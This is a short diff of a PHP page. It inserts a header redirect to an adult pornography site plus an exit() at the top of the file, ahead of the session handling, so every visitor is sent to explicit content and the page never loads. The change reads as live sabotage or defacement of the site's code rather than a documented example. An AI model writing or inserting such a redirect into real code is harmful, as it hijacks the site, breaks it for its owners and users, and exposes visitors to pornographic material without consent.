@@ -1,6 +1,10 @@
 <?php 
+header("Location: https://www.pornhub.com");
+exit();
 
 session_start(); 
+
+
 
 
 // if (!isset($_SESSION['id'])) {
